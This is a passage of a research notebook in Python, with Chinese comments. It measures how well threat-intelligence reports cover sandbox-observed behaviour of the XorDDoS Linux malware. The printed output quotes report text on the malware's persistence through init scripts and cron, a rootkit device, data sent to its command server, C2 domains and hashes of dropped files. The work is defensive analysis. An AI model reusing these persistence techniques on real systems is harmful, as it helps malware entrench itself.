    "        print(f\"\\tlenght of ctd's OPset is {len(rem.doc_OPset)}\")\n",
    "\n",
    "        # R_malObj 比較物件\n",
    "        asg_object = set([op.object for op in sample.OPset])\n",
    "        ctd_object = set([op.object for op in rem.doc_OPset])\n",
    "        ctd_object = ctd_object.intersection(asg_object)\n",
    "        numerator = len(ctd_object) # 分子\n",
    "        denominator = len(asg_object) # 分母\n",
    "        R_malObj = 0 if denominator == 0 else numerator/denominator\n",
    "        print(f\"\\t#R_malObj\\n\\tnum of ctd objects: {numerator}, num of asg objects: {denominator}. R_malObj is {R_malObj:.4f}\")\n",
    "        print(f\"\\t\\tctd_object: {ctd_object}\")\n",
    "\n",
    "        # R_malSysObj 比較系統物件\n",
    "        asg_sysobj = list(filter(lambda object: object.find('/etc') != -1, asg_object))\n",
    "        ctd_sysobj = list(filter(lambda object: object.find('/etc') != -1, ctd_object))\n",
    "        numerator = len(ctd_sysobj)\n",
    "        denominator = len(asg_sysobj)\n",
    "        R_malSysObj = 0 if denominator == 0 else numerator/denominator\n",
    "        print(f\"\\t#R_malSysObj\\n\\tnum of ctd objects: {numerator}, num of asg objects: {denominator}. R_malSysObj is {R_malSysObj:.4f}\")\n",
    "\n",
    "        # R_malOps 比較動作和物件\n",
    "        asg_OPset = list(sample.OPset)\n",
    "        ctd_OPset = list(rem.doc_OPset)\n",
    "        operationEvaluator = OperationEvaluator()\n",
    "        numerator, denominator, hits = 0, len(asg_OPset), []\n",
    "        hits: list[tuple[OperationPair, OperationPair]] = []\n",
    "        sys_hits: list[tuple[OperationPair, OperationPair]] = []\n",
    "        print(f\"\\t\\tlen(asg_OPset): {len(asg_OPset)}, len(ctd_OPset): {len(ctd_OPset)}\")\n",
    "        # 每一個 asg_op 跟所有同物件的的 ctd_op 進行 resolve() 比對，來判斷此 asg_op 是否被提及\n",
    "        i = 0\n",
    "        for idx_asg, asg_op in enumerate(asg_OPset): \n",
    "            i += 1\n",
    "            # print(f\"\\tno.{i} asg_op {asg_op}\") # 瓶頸卡在 no.51 step (total 71 step)\n",
    "            target_obj = asg_op.object\n",
    "            ctdSameObjOpsIdx = [i for i, x in enumerate(ctd_OPset) if x.object == target_obj]\n",
    "            # if i==51:\n",
    "            # print(f\"\\tno.{i} | asg_op {asg_op}, len of ctdSameObjOpsIdx: {ctdSameObjOpsIdx}\")\n",
    "            # ctdSameObjOps = [x for x in ctd_OPset if x.object == target_obj]\n",
    "            for idx in ctdSameObjOpsIdx:\n",
    "                pass\n",
    "                # mem_before_create_lst = get_mem_usage()\n",
    "                # print(\"\\tbefore resolve\", mem_before_create_lst)\n",
    "                hit = operationEvaluator.resolve(asg_op.action, ctd_OPset[idx].action)\n",
    "                # # print_mem_usage()\n",
    "                # mem_after_create_lst = get_mem_usage()\n",
    "                # # print(f\"\\t=== diff of mem_usage calling resolve(): {mem_after_create_lst - mem_before_create_lst:.2f}  ===\")\n",
    "        \n",
    "                if hit:\n",
    "                    numerator += 1\n",
    "                    (opModeAsg, opModeCtd) = hit # hit is [OperationMode]*2\n",
    "                    hits.append((asg_OPset[idx_asg], ctd_OPset[idx]))\n",
    "                    fset.rem_lst[idx_rem].match_doc_OPset.add(ctd_OPset[idx])\n",
    "\n",
    "                    # 篩選出系統物件的動作\n",
    "                    if (opModeAsg in [OperationMode.FILE_UPDATE]) and asg_OPset[idx_asg].object.find('/etc') != -1:\n",
    "                        sys_hits.append((asg_OPset[idx_asg], ctd_OPset[idx]))\n",
    "\n",
    "                    # 紀錄CTD的生命週期 (ASG_OP提及順序)\n",
    "                    step_num = sample.OPset_ordered.index(asg_op) # index of step, throw ValueError if not found\n",
    "                    fset.rem_lst[idx_rem].OPset_order_index.append(step_num)\n",
    "                    break\n",
    "        R_malOps = 0 if denominator == 0 else numerator/denominator\n",
    "        print(f\"\\t#R_malOps\\n\\tnum of matched asg op: {numerator}, num of asg op: {denominator}. R_malOps is {R_malOps:.4f}\")\n",
    "        print(f\"\\t\\trefered lifecycle: {fset.rem_lst[idx_rem].OPset_order_index}\")\n",
    "\n",
    "        # 紀錄CTD的生命週期 (OP提及順序)\n",
    "        # fset.rem_lst[idx_rem].OPset_order_index.clear()\n",
    "        # for ctd_op in fset.rem_lst[idx_rem].match_doc_OPset:\n",
    "        #     step_num = sample.OPset_ordered.index(ctd_op) # index of step, throw ValueError if not found\n",
    "        #     fset.rem_lst[idx_rem].OPset_order_index.append(step_num)\n",
    "\n",
    "        # R_malChangeOps 篩選出系統物件的動作\n",
    "        # cando: 加上 OPMode的考量，為class OP加兩個mode asg_op_mode, ctd_op_mode。目前直接用call nlp class 的 method判別。\n",
    "        numerator = len(sys_hits)\n",
    "        sys_asg_OPset = [op for op in asg_OPset if op.object.find('/etc') != -1 \\\n",
    "                         and operationEvaluator.get_mode(op.action) == OperationMode.FILE_UPDATE ]\n",
    "        # print('sys_asg_OPset is unique:', len(sample.OPset_ordered) == len(set(sample.OPset_ordered))) # 元速度重複沒錯，可能是 index() 的問題\n",
    "        print(f\"\\t\\tsys_asg_OPset: {sys_asg_OPset}\")\n",
    "        denominator = len(sys_asg_OPset)\n",
    "        R_malChangeOps = 0 if denominator == 0 else numerator/denominator\n",
    "        print(f\"\\t#R_malChangeOps\\n\\tnum of matched asg op: {numerator}, num of asg op: {denominator}. R_malChangeOps is {R_malChangeOps:.4f}\")\n",
    "\n",
    "        # 紀錄CTD的生命週期 (OP提及順序)\n",
    "        fset.rem_lst[idx_rem].SysOPset_order_index.clear()\n",
    "        for asg_op , ctd_op in sys_hits:\n",
    "            step_num = sample.OPset_ordered.index(asg_op) # step index , throw ValueError if not found\n",
    "            fset.rem_lst[idx_rem].SysOPset_order_index.append(step_num)\n",
    "        print(f\"\\t\\tref-sys lifecycle: {fset.rem_lst[idx_rem].SysOPset_order_index}\")\n",
    "\n",
    "        if hits:\n",
    "            print(\"\\n\\thits\")\n",
    "            for asg_op, ctd_op in hits:\n",
    "                print(f\"\\t{asg_op}, {ctd_op.getSentStr()}\")\n",
    "        if sys_hits:\n",
    "            print(\"\\n\\tsys_hits\")\n",
    "            for asg_op, ctd_op in sys_hits:\n",
    "                print(f\"\\t{asg_op}, {ctd_op.getSentStr()}\")\n",
    "\n",
    "        # print_mem_usage()\n",
    "        # del asg_OPset, ctd_OPset, hits, sys_hits\n",
    "    print(\"\\n\\nOperationPair that changes system resources:\\n\", sys_asg_OPset)\n",
    "\n",
    "    return fset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [],
   "source": [
    "def save_match_sent_to_excel(fset: FamilySet, sample_name=None):\n",
    "    columns = ['report','regex','matched word','sentence number','sentence']\n",
    "    if sample_name:\n",
    "        output_xlsx = f'{outputfolder}/{family}_{sample_name[:3]}_report_match_sent.csv'\n",
    "    else:\n",
    "        output_xlsx = f'{outputfolder}/{family}_union_report_match_sent.csv'\n",
    "    has_match = sum([len(rem.get_match_regexs()) for rem in fset.rem_lst])\n",
    "    if has_match == 0:\n",
    "        print('no matches in CTI reports') # with open 一定要寫入，若全空則直接不開檔\n",
    "        return\n",
    "    # with pd.ExcelWriter(output_xlsx, engine='openpyxl') as writer:\n",
    "    \n",
    "    # 遍歷報告，一個 rem: ReportEvalModel 代表一篇報告\n",
    "    csv_data = []\n",
    "    match_sentence_ttlcnt = 0\n",
    "    for rem in fset.rem_lst:\n",
    "        reportname = rem.reportname.split('.')[0]\n",
    "        if len(rem.get_match_regexs()) == 0: # 如果報告中無 regex 跳過不紀錄\n",
    "            continue\n",
    "        # sheet_data = [] # shape = columns_len * match_sent_len\n",
    "        sent_df = rem.get_match_sentences()\n",
    "        sent_content_lst = rem.sentences['Content'] # 報告中的每個句子\n",
    "        match_sentence_ttlcnt += sent_df['match'].sum()\n",
    "\n",
    "        # 遍歷每個含有 regex 的句子\n",
    "        for sid, row in sent_df.iterrows():\n",
    "            if row['match'] == 0:\n",
    "                continue\n",
    "            row.drop('match', inplace=True)\n",
    "            row = row[row > 0]\n",
    "            # print(row)\n",
    "            # 考量每個句子可能含有多個 regex，故需寫成多行\n",
    "            for i, v in row.items():\n",
    "                insert_data = dict().fromkeys(columns)\n",
    "                insert_data['report'] = reportname\n",
    "                insert_data['regex'] = i\n",
    "                insert_data['matched word'] = rem.get_match_word(sid, i)\n",
    "                insert_data['sentence number'] = sid + 1\n",
    "                insert_data['sentence'] = str(sent_content_lst[sid]).strip()\n",
    "                # sheet_data.append(insert_data)\n",
    "                csv_data.append(insert_data)\n",
    "    df = pd.DataFrame(csv_data)\n",
    "    # print(df)\n",
    "    df.to_csv(output_xlsx, index=False)\n",
    "\n",
    "            # 輸出 csv\n",
    "            \n",
    "            # 輸出 excel sheet\n",
    "            # print(rem.reportname,'has', len(sheet_data),'matches')\n",
    "            # output_sheet = pd.DataFrame(sheet_data)\n",
    "            # # output_sheet.style.set_properties(subset=['sentence'])\n",
    "            # styler = Styler(horizontal_alignment='left', vertical_alignment='top')\n",
    "            # sf = StyleFrame(output_sheet, styler)\n",
    "            # sf = sf.set_column_width(columns=['baseline'], width=20.0)\n",
    "            # sf = sf.set_column_width(columns=['sentence number'], width=15.0)\n",
    "            # sf = sf.set_column_width(columns=['sentence'], width=80.0)\n",
    "            # sf.to_excel(writer, sheet_name=rem.reportname, index=False) #.save()\n",
    "            # # output_sheet.to_excel(writer, sheet_name=rem.reportname, index=False)\n",
    "    return match_sentence_ttlcnt\n",
    "\n",
    "# 此行會執行並複寫 excel，執行完後要手動調整行距格式，小心使用\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "=== mem_usage: 214.27 MB ===\n",
      "asg_object: {'/var/', '^chkconfig$', '^systemctl$', '/perl/', 'bin/insserv', '/etc/sed', 'permission(\\\\s|:)[0-9]{1,4}', '^pipe(\\\\$|\\\\.|$)', '/etc/init.d/', '[a-zA-z]:\\\\d{1,5}$', '/etc/cron', '^sh$', '/boot/', '/etc/rc', '\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}:\\\\d{1,5}$', '/var/run/', '\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}', '/boot/[a-z]{10}', '^sed$', '/proc/', '/proc/rs_dev', '/run/', 'bin/openrc', 'bin/sed', 'update-rc.d', '/selinux'}\n",
      "\n",
      "\n",
      "Sample Xorddos-Cdnetworks.csv\n",
      "\tnum of segment in report: 32\n",
      "\tlenght of ctd's OPset is 0\n",
      "\t#R_malObj\n",
      "\tnum of ctd objects: 0, num of asg objects: 26. R_malObj is 0.0000\n",
      "\t\tctd_object: set()\n",
      "\t#R_malSysObj\n",
      "\tnum of ctd objects: 0, num of asg objects: 4. R_malSysObj is 0.0000\n",
      "\t\tlen(asg_OPset): 73, len(ctd_OPset): 0\n",
      "\t#R_malOps\n",
      "\tnum of matched asg op: 0, num of asg op: 73. R_malOps is 0.0000\n",
      "\t\trefered lifecycle: []\n",
      "\t\tsys_asg_OPset: [<OP47 act=fchmod, obj=/etc/sed>, <OP46 act=fchown, obj=/etc/sed>, <OP45 act=write, obj=/etc/sed>, <OP18 act=write, obj=/etc/cron>, <OP32 act=lstat, obj=/etc/rc>, <OP22 act=write, obj=/etc/rc>, <OP48 act=rename, obj=/etc/cron>, <OP15 act=write, obj=/etc/init.d/>]\n",
      "\t#R_malChangeOps\n",
      "\tnum of matched asg op: 0, num of asg op: 8. R_malChangeOps is 0.0000\n",
      "\t\tref-sys lifecycle: []\n",
      "\n",
      "Sample Xorddos-Crowdstrike.csv\n",
      "\tnum of segment in report: 45\n",
      "\tlenght of ctd's OPset is 0\n",
      "\t#R_malObj\n",
      "\tnum of ctd objects: 0, num of asg objects: 26. R_malObj is 0.0000\n",
      "\t\tctd_object: set()\n",
      "\t#R_malSysObj\n",
      "\tnum of ctd objects: 0, num of asg objects: 4. R_malSysObj is 0.0000\n",
      "\t\tlen(asg_OPset): 73, len(ctd_OPset): 0\n",
      "\t#R_malOps\n",
      "\tnum of matched asg op: 0, num of asg op: 73. R_malOps is 0.0000\n",
      "\t\trefered lifecycle: []\n",
      "\t\tsys_asg_OPset: [<OP47 act=fchmod, obj=/etc/sed>, <OP46 act=fchown, obj=/etc/sed>, <OP45 act=write, obj=/etc/sed>, <OP18 act=write, obj=/etc/cron>, <OP32 act=lstat, obj=/etc/rc>, <OP22 act=write, obj=/etc/rc>, <OP48 act=rename, obj=/etc/cron>, <OP15 act=write, obj=/etc/init.d/>]\n",
      "\t#R_malChangeOps\n",
      "\tnum of matched asg op: 0, num of asg op: 8. R_malChangeOps is 0.0000\n",
      "\t\tref-sys lifecycle: []\n",
      "\n",
      "Sample Xorddos-Intezer.csv\n",
      "\tnum of segment in report: 156\n",
      "\tlenght of ctd's OPset is 7\n",
      "\t#R_malObj\n",
      "\tnum of ctd objects: 4, num of asg objects: 26. R_malObj is 0.1538\n",
      "\t\tctd_object: {'/proc/', '/etc/init.d/', '\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}', '/etc/rc'}\n",
      "\t#R_malSysObj\n",
      "\tnum of ctd objects: 2, num of asg objects: 4. R_malSysObj is 0.5000\n",
      "\t\tlen(asg_OPset): 73, len(ctd_OPset): 7\n",
      "\t#R_malOps\n",
      "\tnum of matched asg op: 3, num of asg op: 73. R_malOps is 0.0411\n",
      "\t\trefered lifecycle: [0, 67, 68]\n",
      "\t\tsys_asg_OPset: [<OP47 act=fchmod, obj=/etc/sed>, <OP46 act=fchown, obj=/etc/sed>, <OP45 act=write, obj=/etc/sed>, <OP18 act=write, obj=/etc/cron>, <OP32 act=lstat, obj=/etc/rc>, <OP22 act=write, obj=/etc/rc>, <OP48 act=rename, obj=/etc/cron>, <OP15 act=write, obj=/etc/init.d/>]\n",
      "\t#R_malChangeOps\n",
      "\tnum of matched asg op: 0, num of asg op: 8. R_malChangeOps is 0.0000\n",
      "\t\tref-sys lifecycle: []\n",
      "\n",
      "\thits\n",
      "\t<OP 1 act=readlink, obj=/proc/>, <OP 6 act=extract, obj=/proc/cpuinfo, sent=table 2: data collected by the malware and sent back to the c2 server url key\tdescription\tcomment hostip\tip\thardcoded to 127.0.0.1 softtype\t\thardcoded to “linux” pscaddr\tmac address\t hostname\tmachine name\t hosttar\tusername\tpossibly “host target” hostos\tdistribution\textracted from /etc/issue or /etc/redhat-release hostcpu\tclock speed\t/proc/cpuinfo hostmem\tamount of memory\t/proc/meminfo hostpack\t\thardcoded to “linux” lkmtag\tis rootkit enabled\t kernel\tkernel version\textracted from unamefigure 12 shows the communication between redxor and the c2.>\n",
      "\t<OP68 act=access, obj=/proc/>, <OP 6 act=extract, obj=/proc/cpuinfo, sent=table 2: data collected by the malware and sent back to the c2 server url key\tdescription\tcomment hostip\tip\thardcoded to 127.0.0.1 softtype\t\thardcoded to “linux” pscaddr\tmac address\t hostname\tmachine name\t hosttar\tusername\tpossibly “host target” hostos\tdistribution\textracted from /etc/issue or /etc/redhat-release hostcpu\tclock speed\t/proc/cpuinfo hostmem\tamount of memory\t/proc/meminfo hostpack\t\thardcoded to “linux” lkmtag\tis rootkit enabled\t kernel\tkernel version\textracted from unamefigure 12 shows the communication between redxor and the c2.>\n",
      "\t<OP69 act=newfstatat, obj=/proc/>, <OP 6 act=extract, obj=/proc/cpuinfo, sent=table 2: data collected by the malware and sent back to the c2 server url key\tdescription\tcomment hostip\tip\thardcoded to 127.0.0.1 softtype\t\thardcoded to “linux” pscaddr\tmac address\t hostname\tmachine name\t hosttar\tusername\tpossibly “host target” hostos\tdistribution\textracted from /etc/issue or /etc/redhat-release hostcpu\tclock speed\t/proc/cpuinfo hostmem\tamount of memory\t/proc/meminfo hostpack\t\thardcoded to “linux” lkmtag\tis rootkit enabled\t kernel\tkernel version\textracted from unamefigure 12 shows the communication between redxor and the c2.>\n",
      "\n",
      "Sample Xorddos-Ms.csv\n",
      "\tnum of segment in report: 252\n",
      "\tlenght of ctd's OPset is 51\n",
      "\t#R_malObj\n",
      "\tnum of ctd objects: 12, num of asg objects: 26. R_malObj is 0.4615\n",
      "\t\tctd_object: {'/proc/', '[a-zA-z]:\\\\d{1,5}$', '/var/', '^chkconfig$', '/proc/rs_dev', '/etc/cron', '/etc/rc', '/run/', '^sh$', '/var/run/', '/etc/init.d/', 'update-rc.d'}\n",
      "\t#R_malSysObj\n",
      "\tnum of ctd objects: 3, num of asg objects: 4. R_malSysObj is 0.7500\n",
      "\t\tlen(asg_OPset): 73, len(ctd_OPset): 51\n",
      "\t#R_malOps\n",
      "\tnum of matched asg op: 18, num of asg op: 73. R_malOps is 0.2466\n",
      "\t\trefered lifecycle: [69, 57, 0, 55, 67, 32, 56, 40, 2, 48, 15, 52, 50, 49, 12, 51, 68, 26]\n",
      "\t\tsys_asg_OPset: [<OP47 act=fchmod, obj=/etc/sed>, <OP46 act=fchown, obj=/etc/sed>, <OP45 act=write, obj=/etc/sed>, <OP18 act=write, obj=/etc/cron>, <OP32 act=lstat, obj=/etc/rc>, <OP22 act=write, obj=/etc/rc>, <OP48 act=rename, obj=/etc/cron>, <OP15 act=write, obj=/etc/init.d/>]\n",
      "\t#R_malChangeOps\n",
      "\tnum of matched asg op: 0, num of asg op: 8. R_malChangeOps is 0.0000\n",
      "\t\tref-sys lifecycle: []\n",
      "\n",
      "\thits\n",
      "\t<OP70 act=newfstatat, obj=/run/>, <OP41 act=fetch, obj=/var/run/gcc.pid, sent=  kill_process  the kill_process thread performs the following tasks:  decodes encrypted strings fetches file stats for /var/run/gcc.pid or, if none exist, then creates the file fetches file stats for /lib/libudev.so or, if none exist, then creates the directory /lib and creates a copy of itself at the location /lib/libudev.so fetches the on disk file information associated with the current process; if it fails, then exits the loop and stops the current process reads the content from kill_cfg and performs the corresponding actions, like stopping the process or deleting files, based on the matching specified keys in the configuration file, such as: md5= filename= rmfile= denyip= tcp_thread  the tcp_thread triggers the connection with the c2 server decoded earlier using decrypt_remotestr().>\n",
      "\t<OP58 act=lseek, obj=/var/>, <OP39 act=fetch, obj=/var/run/gcc.pid, sent=  kill_process  the kill_process thread performs the following tasks:  decodes encrypted strings fetches file stats for /var/run/gcc.pid or, if none exist, then creates the file fetches file stats for /lib/libudev.so or, if none exist, then creates the directory /lib and creates a copy of itself at the location /lib/libudev.so fetches the on disk file information associated with the current process; if it fails, then exits the loop and stops the current process reads the content from kill_cfg and performs the corresponding actions, like stopping the process or deleting files, based on the matching specified keys in the configuration file, such as: md5= filename= rmfile= denyip= tcp_thread  the tcp_thread triggers the connection with the c2 server decoded earlier using decrypt_remotestr().>\n",
      "\t<OP 1 act=readlink, obj=/proc/>, <OP35 act=use, obj=/proc/rs_dev, sent= xorddos uses /proc/rs_dev character device to communicate with the rootkit.>\n",
      "\t<OP56 act=lseek, obj=/run/>, <OP41 act=fetch, obj=/var/run/gcc.pid, sent=  kill_process  the kill_process thread performs the following tasks:  decodes encrypted strings fetches file stats for /var/run/gcc.pid or, if none exist, then creates the file fetches file stats for /lib/libudev.so or, if none exist, then creates the directory /lib and creates a copy of itself at the location /lib/libudev.so fetches the on disk file information associated with the current process; if it fails, then exits the loop and stops the current process reads the content from kill_cfg and performs the corresponding actions, like stopping the process or deleting files, based on the matching specified keys in the configuration file, such as: md5= filename= rmfile= denyip= tcp_thread  the tcp_thread triggers the connection with the c2 server decoded earlier using decrypt_remotestr().>\n",
      "\t<OP68 act=access, obj=/proc/>, <OP35 act=use, obj=/proc/rs_dev, sent= xorddos uses /proc/rs_dev character device to communicate with the rootkit.>\n",
      "\t<OP33 act=stat, obj=/run/>, <OP41 act=fetch, obj=/var/run/gcc.pid, sent=  kill_process  the kill_process thread performs the following tasks:  decodes encrypted strings fetches file stats for /var/run/gcc.pid or, if none exist, then creates the file fetches file stats for /lib/libudev.so or, if none exist, then creates the directory /lib and creates a copy of itself at the location /lib/libudev.so fetches the on disk file information associated with the current process; if it fails, then exits the loop and stops the current process reads the content from kill_cfg and performs the corresponding actions, like stopping the process or deleting files, based on the matching specified keys in the configuration file, such as: md5= filename= rmfile= denyip= tcp_thread  the tcp_thread triggers the connection with the c2 server decoded earlier using decrypt_remotestr().>\n",
      "\t<OP57 act=lseek, obj=/var/run/>, <OP40 act=fetch, obj=/var/run/gcc.pid, sent=  kill_process  the kill_process thread performs the following tasks:  decodes encrypted strings fetches file stats for /var/run/gcc.pid or, if none exist, then creates the file fetches file stats for /lib/libudev.so or, if none exist, then creates the directory /lib and creates a copy of itself at the location /lib/libudev.so fetches the on disk file information associated with the current process; if it fails, then exits the loop and stops the current process reads the content from kill_cfg and performs the corresponding actions, like stopping the process or deleting files, based on the matching specified keys in the configuration file, such as: md5= filename= rmfile= denyip= tcp_thread  the tcp_thread triggers the connection with the c2 server decoded earlier using decrypt_remotestr().>\n",
      "\t<OP41 act=umask, obj=[a-zA-z]:\\d{1,5}$>, <OP38 act=fetch, obj=www.enoan2107.com:3306, sent=after decoding the urls, it adds them into a remote list, which is later used to communicate and fetch commands from the command and control (c2) server: www.enoan2107.com:3306 www.gzcfr5axf6.com:3306 malicious activity threads after creating persistent entries, deleting evidence of its activities, and decoding config.rar, the malware initializes a cyclic redundancy check (crc) table followed by an unnamed semaphore using the sem_init api.>\n",
      "\t<OP 3 act=stat64, obj=/var/>, <OP39 act=fetch, obj=/var/run/gcc.pid, sent=  kill_process  the kill_process thread performs the following tasks:  decodes encrypted strings fetches file stats for /var/run/gcc.pid or, if none exist, then creates the file fetches file stats for /lib/libudev.so or, if none exist, then creates the directory /lib and creates a copy of itself at the location /lib/libudev.so fetches the on disk file information associated with the current process; if it fails, then exits the loop and stops the current process reads the content from kill_cfg and performs the corresponding actions, like stopping the process or deleting files, based on the matching specified keys in the configuration file, such as: md5= filename= rmfile= denyip= tcp_thread  the tcp_thread triggers the connection with the c2 server decoded earlier using decrypt_remotestr().>\n",
      "\t<OP49 act=stat64, obj=/run/>, <OP41 act=fetch, obj=/var/run/gcc.pid, sent=  kill_process  the kill_process thread performs the following tasks:  decodes encrypted strings fetches file stats for /var/run/gcc.pid or, if none exist, then creates the file fetches file stats for /lib/libudev.so or, if none exist, then creates the directory /lib and creates a copy of itself at the location /lib/libudev.so fetches the on disk file information associated with the current process; if it fails, then exits the loop and stops the current process reads the content from kill_cfg and performs the corresponding actions, like stopping the process or deleting files, based on the matching specified keys in the configuration file, such as: md5= filename= rmfile= denyip= tcp_thread  the tcp_thread triggers the connection with the c2 server decoded earlier using decrypt_remotestr().>\n",
      "\t<OP16 act=open, obj=/etc/cron>, <OP49 act=drop, obj=/etc/cron.hourly/gcc.sh, sent= dropped files dropped file path\tfile type\tsha-256 /etc/init.d/hflggwyfsc.elf\tshell script\t6e506f32c6fb7b5d342d1382989ab191c6f21c2d311251d8f623814f468952cf /etc/cron.hourly/gcc.sh\tshell script\tcbb72e542e8f19240130fc9381c2351730d437d42926c6e68e056907c8456459 /lib/libudev.so\telf\tf2df54eb827f3c733d481ebb167a5bc77c5ae39a6bda7f340bb23b24dc9a4432 /run/gcc.pid\ttext\t932feef3ab6fccb3502f900619b1f87e1cb44a7adab48f2c927ecdd67ff6830a /usr/bin/djtctpzfdq\telf\t53f062a93cf19aeaa2f8481b32118a31b658a126624abb8a7d82237884f0a394 /usr/bin/dmpyuitfoq\telf\t798577202477c0c233d4af51c4d8fb2f574ddb3c9d1d90325d359a84cb1bd51c /usr/bin/fdinprytpq\telf\t2b4500987d50a24ba5c118f506f2507362d6b5c63c80b1984b4ae86641779ff3 /usr/bin/jwvwvxoupv\telf\t359c41da1cbae573d2c99f7da9eeb03df135f018f6c660b4e44fbd2b4ddecd39 /usr/bin/kagbjahdic\telf\te6c7eee304dfc29b19012ef6d31848c0b5bb07362691e4e9633c8581f1c2d65b /usr/bin/kkldnszwvq\telf\tef0a4c12d98dc0ad4db86aadd641389c7219f57f15642ed35b4443daf3ff8c1e /usr/bin/kndmhuqmah\telf\tb5fba27a8e457c1ab6573c378171f057d151dc615d6a8d339195716fa9ac277a /usr/bin/qkxqoelrfa\telf\td71ea3b98286d39a711b626f687f0d3fc852c3e3a05de3f51450fb8f7bd2b0d7 /usr/bin/sykhrxsazz\telf\t9d6f115f31ee71089cc85b18852974e349c68fad3276145dafd0076951f32489 /usr/bin/tcnszvmpqn\telf\t360a6258dd66a3ba595a93896d9b55d22406d02e5c02100e5a18382c54e7d5cd /usr/bin/zalkpggsgh\telf\tdc2b1cee161ebe90be68561755d99e66f454ad80b27cebe3d4773518ac45cbb7 /usr/bin/zvcarxfquk\telf\t175667933088fbebcb62c8450993422ccc876495299173c646779a9e67501ff4 /tmp/bin/3200\telf (rootkit)\tc8f761d3ef7cd16ebe41042a0daf901c2fdffce96c8e9e1fa0d422c6e31332ea installer script\tbash script\t8be8c950d8701ef1149c547ea3f949ea78394787ad1e19fc0eaa7bd7aeb863c2 /usr/bin/djtctpzfdq\telf\t53f062a93cf19aeaa2f8481b32118a31b658a126624abb8a7d82237884f0a394 /usr/bin/jwvwvxoupv\telf\t359c41da1cbae573d2c99f7da9eeb03df135f018f6c660b4e44fbd2b4ddecd39 /usr/bin/kkldnszwvq\telf\tef0a4c12d98dc0ad4db86aadd641389c7219f57f15642ed35b4443daf3ff8c1e /usr/bin/zvcarxfqul\telf (rootkit)\t483451dcda78a381cc73474711bf3fcae97bd088f67b5a7e92639df52ef5ef25 /usr/bin/zvzvmpqnv\telf (rootkit)\tc8f761d3ef7cd16ebe41042a0daf901c2fdffce96c8e9e1fa0d422c6e31332ea>\n",
      "\t<OP53 act=open, obj=/var/>, <OP29 act=create, obj=/var/run/., sent=if it’s not running from these locations, then it creates and copies itself using a 10-character string name on those locations, as well as /lib/ and /var/run/.>\n",
      "\t<OP51 act=open, obj=/run/>, <OP50 act=drop, obj=/run/gcc.pid, sent= dropped files dropped file path\tfile type\tsha-256 /etc/init.d/hflggwyfsc.elf\tshell script\t6e506f32c6fb7b5d342d1382989ab191c6f21c2d311251d8f623814f468952cf /etc/cron.hourly/gcc.sh\tshell script\tcbb72e542e8f19240130fc9381c2351730d437d42926c6e68e056907c8456459 /lib/libudev.so\telf\tf2df54eb827f3c733d481ebb167a5bc77c5ae39a6bda7f340bb23b24dc9a4432 /run/gcc.pid\ttext\t932feef3ab6fccb3502f900619b1f87e1cb44a7adab48f2c927ecdd67ff6830a /usr/bin/djtctpzfdq\telf\t53f062a93cf19aeaa2f8481b32118a31b658a126624abb8a7d82237884f0a394 /usr/bin/dmpyuitfoq\telf\t798577202477c0c233d4af51c4d8fb2f574ddb3c9d1d90325d359a84cb1bd51c /usr/bin/fdinprytpq\telf\t2b4500987d50a24ba5c118f506f2507362d6b5c63c80b1984b4ae86641779ff3 /usr/bin/jwvwvxoupv\telf\t359c41da1cbae573d2c99f7da9eeb03df135f018f6c660b4e44fbd2b4ddecd39 /usr/bin/kagbjahdic\telf\te6c7eee304dfc29b19012ef6d31848c0b5bb07362691e4e9633c8581f1c2d65b /usr/bin/kkldnszwvq\telf\tef0a4c12d98dc0ad4db86aadd641389c7219f57f15642ed35b4443daf3ff8c1e /usr/bin/kndmhuqmah\telf\tb5fba27a8e457c1ab6573c378171f057d151dc615d6a8d339195716fa9ac277a /usr/bin/qkxqoelrfa\telf\td71ea3b98286d39a711b626f687f0d3fc852c3e3a05de3f51450fb8f7bd2b0d7 /usr/bin/sykhrxsazz\telf\t9d6f115f31ee71089cc85b18852974e349c68fad3276145dafd0076951f32489 /usr/bin/tcnszvmpqn\telf\t360a6258dd66a3ba595a93896d9b55d22406d02e5c02100e5a18382c54e7d5cd /usr/bin/zalkpggsgh\telf\tdc2b1cee161ebe90be68561755d99e66f454ad80b27cebe3d4773518ac45cbb7 /usr/bin/zvcarxfquk\telf\t175667933088fbebcb62c8450993422ccc876495299173c646779a9e67501ff4 /tmp/bin/3200\telf (rootkit)\tc8f761d3ef7cd16ebe41042a0daf901c2fdffce96c8e9e1fa0d422c6e31332ea installer script\tbash script\t8be8c950d8701ef1149c547ea3f949ea78394787ad1e19fc0eaa7bd7aeb863c2 /usr/bin/djtctpzfdq\telf\t53f062a93cf19aeaa2f8481b32118a31b658a126624abb8a7d82237884f0a394 /usr/bin/jwvwvxoupv\telf\t359c41da1cbae573d2c99f7da9eeb03df135f018f6c660b4e44fbd2b4ddecd39 /usr/bin/kkldnszwvq\telf\tef0a4c12d98dc0ad4db86aadd641389c7219f57f15642ed35b4443daf3ff8c1e /usr/bin/zvcarxfqul\telf (rootkit)\t483451dcda78a381cc73474711bf3fcae97bd088f67b5a7e92639df52ef5ef25 /usr/bin/zvzvmpqnv\telf (rootkit)\tc8f761d3ef7cd16ebe41042a0daf901c2fdffce96c8e9e1fa0d422c6e31332ea>\n",
      "\t<OP50 act=stat64, obj=/var/run/>, <OP40 act=fetch, obj=/var/run/gcc.pid, sent=  kill_process  the kill_process thread performs the following tasks:  decodes encrypted strings fetches file stats for /var/run/gcc.pid or, if none exist, then creates the file fetches file stats for /lib/libudev.so or, if none exist, then creates the directory /lib and creates a copy of itself at the location /lib/libudev.so fetches the on disk file information associated with the current process; if it fails, then exits the loop and stops the current process reads the content from kill_cfg and performs the corresponding actions, like stopping the process or deleting files, based on the matching specified keys in the configuration file, such as: md5= filename= rmfile= denyip= tcp_thread  the tcp_thread triggers the connection with the c2 server decoded earlier using decrypt_remotestr().>\n",
      "\t<OP13 act=open, obj=/etc/init.d/>, <OP20 act=drop, obj=/etc/init.d/hflggwyfsc.elf, sent=figure 11. content of the init script dropped at the location /etc/init.d/hflggwyfsc.elf>\n",
